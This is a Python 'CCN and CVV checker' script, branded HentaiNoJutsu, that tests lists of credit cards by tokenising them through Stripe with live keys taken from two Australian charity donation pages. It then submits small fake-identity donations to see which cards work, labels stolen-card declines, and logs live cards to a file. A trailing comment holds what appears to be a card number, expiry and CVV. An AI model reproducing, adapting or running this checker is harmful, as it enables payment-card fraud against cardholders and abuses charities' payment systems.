#-*- coding: utf-8 -*-
from colorama import Fore, Back, init
from faker import Faker
from bs4 import BeautifulSoup
import requests
import random
import json
import time
import string
import os


init()
def StripeCVV(credit_card, ccEntry):
    infogen = Faker()
    email = infogen.email()
    ccentry = str(ccEntry)
    ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
    api_token = "https://api.stripe.com/v1/tokens"
    merchant = "https://forestsforlife.org.au/donate/"
    session = requests.Session()
    main_source = BeautifulSoup(session.get("https://forestsforlife.org.au/donate/").text, "html.parser")
    user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
    headers = {
        'User-Agent': user_agent,
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    stripe_data = {
        "validation_type": "card",
        "payment_user_agent": "stripe.js/e3fc3552; stripe-js-v3/e3fc3552",
        "user_agent": user_agent,
        "referrer": "https://forestsforlife.raisely.com/embed/",
        "pasted_fields": "number",
        "card[number]": ccNum,
        "card[exp_month]": ccMonth,
        "card[exp_year]": ccYear[2:],
        "card[name]": email,
        "card[cvc]": ccCode,
        "guid": "NA",
        "muid": "b807a7cc-6a68-4a3b-8008-ea0a88d93df6",
        "sid": "03741761-44f3-4f4b-9a01-60e6d089d92d",
        "key": "pk_live_IuO9apxOM1AclLg9TOTxjUS0",
    }

    try:
        stripe_response = json.loads(session.post(api_token, data=stripe_data, headers=headers).text)
    except Exception:
        print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + 'Connection Error' + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        return

    try:
        er = stripe_response['error']
        if 'pickup_card' in er['decline_code']:
            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + 'Stolen/Reported Card' + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
            return
        else:
            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + er['decline_code'] + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')

        return

    except Exception as e:
        try:
            er = stripe_response['error']
            if 'incorrect_cvc' in er['code']:
                print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\t' + '[CCN Only]' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
                return
            else:
                print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + er['message'] + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
                return
        except Exception as e:
            # print(e)
            pass
            # print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + 'Declined.' + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        pass

    token_data = stripe_response['id']

    charge_data = {
       "data":{
          "email":infogen.email(),
          "message":"",
          "anonymous":True,
          "public":{
             "photo_url":"",
             "total":"2.00",
             "donation_amount":"2.00",
             "fee":"0.00",
             "currency_symbol":"$"
          },
          "amount":200,
          "feeOptIn":False,
          "fee":0,
          "currency":"AUD",
          "firstName":infogen.first_name(),
          "lastName":infogen.last_name(),
          "type":"ONLINE",
          "profileUuid":"1f7edfd0-14b7-11e9-a41d-7b7c7d92e7c1",
          "method":"CREDIT_CARD",
          "token":token_data,
          "campaignUuid":"1f678740-14b7-11e9-a41d-7b7c7d92e7c1"
       }
    }

    try:
        charge_req = json.loads(session.post('https://forestsforlife.raisely.com/api/v3/donations/?key=1f678740-14b7-11e9-a41d-7b7c7d92e7c1', json=charge_data).text)
    except ConnectionError:
        print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + 'Connection Error' + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        return

    try:
        error = charge_req['errors'][0]
        if 'insufficient funds.' in error['message']:
            print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\t' + '[CVV Passed ($2: Failed)]' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        else:
            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + error['message'] + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
    except Exception as e:
        print(e)
        print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\t' + '[CVV Passed ($2: Success)]' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')


def StripeCCN(credit_card, ccEntry):
    email = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15)) + "@yahoo.com"
    ccentry = str(ccEntry)
    ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
    api_token = "https://api.stripe.com/v1/tokens"
    merchant = "https://echointernational.org.au/give/"

    session = requests.Session()
    main_source = BeautifulSoup(session.get("https://echointernational.org.au/give/").text, "html.parser")
    user_agent =  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
    header = {'User-Agent': user_agent}

    stripe_data = {
        "guid": "NA",
        "key": "pk_live_ViAS2zcGQPVs76uSofJx5dmI",
        "validation_type": "card",
        "payment_user_agent": "stripe.js/303cf2d",
        "card[number]": ccNum,
        "card[exp_month]": ccMonth.replace('0', ''),
        "card[exp_year]": ccYear,
        "card[cvc]": ccCode,
        "card[name]": "Hentaino Jutsu",
    }
    try:
        stripe_response = session.post(api_token, data=stripe_data, headers=header).text
    except Exception:
        print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + 'Connection Error' + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        return

    stripe_response_ = json.loads(stripe_response)

    try:
        er = stripe_response_['error']
        if 'pickup_card' in er['decline_code']:
            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + 'Stolen/Reported Card' + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
            return
        else:
            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + er['decline_code'] + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        
        return

    except Exception as e:
        try:
            er = stripe_response_['error']
            if 'incorrect_cvc' in er['code']:
                print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\t' + '[CCN Only]' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
                return
            else:
                print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + er['message'] + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
                return
        except:
            pass

        pass

    merchant_data = {
        'input_4.3': 'Hentaino',
        'input_4.6': 'Jutsu',
        'input_3': email,
        'input_9': 'Another amount|0',
        'input_11': '$ 5.00',
        'input_10': 'Donate once only|0',
        'input_8': '5',
        'input_12': 'All Projects',
        'is_submit_1': '1',
        'gform_submit': '1',
        'gform_unique_id': '',
        'state_1': 'WyJ7XCI5XCI6W1wiM2ExOTQ5ZGM0NmQ3NGJlZjI0NTEyY2E3MDVkODEwNzNcIixcIjRhOWMxMDA5NTY1OWE1YTY5OTZmZDZiN2MwYThmZWQ4XCIsXCI1MDNlZmI0OThkMTRmZWFjYTczNDNiZmEyMTA1MmMxZFwiLFwiZTA1NDJmZjM1YjdiY2M0NDE1YWVmNTdiMTA3ZWRhODhcIl0sXCIxMFwiOltcIjgxNDkyNzU3Njg1YmViMzg1NmUyZTAyYmMwYmZiY2I2XCIsXCI2NjBjOGQ0OWVjZmIzZDI1MzNkNTM5ZjhiM2JmYmI3Y1wiXX0iLCI0ZTVhZTFmY2UwMzJiM2NjNmRlNjhlMmU5YmE2YTQ0ZSJd',
        'gform_target_page_number_1': '0',
        'gform_source_page_number_1': '1',
        'gform_field_values': '',
        'stripe_credit_card_last_four': stripe_response_['card']['last4'],
        'stripe_credit_card_type': stripe_response_['card']['brand'],
        'stripe_response': stripe_response
    }

    try:
       result_ = session.post(merchant, data=merchant_data, headers=header).text.encode('utf-8')
    except Exception:
        print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + 'Connection Error' + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        return

    result = BeautifulSoup(result_, 'html.parser')
    
    try:
        error = result.find('div', {'id': 'validation_message_1_5'}).get_text()
        if "security code is incorrect" in error:
            if not os.path.exists('lives(CCN).txt'):
                f = open('lives(CCN).txt', 'w+')
                f.write('-->  ' + credit_card + '  <--' + '\n')
                f.close()
            else:
                f = open('lives(CCN).txt', 'a')
                f.write('-->  ' + credit_card + '  <--\n')
                f.close()

            print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\t' + '[CCN Only]' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        else:
            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\t[' + error + ']' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
    except Exception as e:
        with open('tests.html', 'w+') as t:
            t.write(result_.text)
            t.close()
        print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\t' + '[CVV Passed]' + '\t[' + time.ctime() + ']' + ' - HentaiNoJutsu')
        exit(1)

def main():
    credit_card_lists = open('cc.txt', 'r').read()
    entries = 0

    banner = Fore.GREEN + """
   __ __         __       _   _  __          __     __          
  / // /__ ___  / /____ _(_) / |/ /__    __ / /_ __/ /____ __ __
 / _  / -_) _ \/ __/ _ `/ / /    / _ \  / // / // / __(_-</ // /
/_//_/\__/_//_/\__/\_,_/_/ /_/|_/\___/  \___/\_,_/\__/___/\_,_/ 
            CCN and CVV Checker (Stripe)
                                                                
        [1]  ------- CCN/CVV Checker (Secret hehehe)
                                                                 """
    print(banner)
    print()
    print(Fore.RESET)
    prompt = '[HentaiNoJutsu]:~$ '
    while True:
        userInp = input(prompt)

        if userInp.lower() == "1":
            print('[*] Checking ' + str(len(credit_card_lists.split('\n'))))
            print('-' * 20)

            for cc in credit_card_lists.split('\n'):
                entries += 1
                StripeCVV(cc, entries)
            print('-' * 20)
            print('[*] Checked ' + str(len(credit_card_lists.split('\n'))) + ' Credit Cards - Done')

        elif userInp.lower() == "2":
            print('[*] Maintenance :( ')
            # print('[*] Checking ' + str(len(credit_card_lists.split('\n'))))
            # print('-' * 20)
            # for cc in credit_card_lists.split('\n'):
            #     entries += 1
            #     StripeCCN(cc, entries)
            # print('-' * 20)
            # print('[*] Checked ' + str(len(credit_card_lists.split('\n'))) + ' Credit Cards - Done')
        else:
            pass
#5210690438400676
#12 27
#646
main()
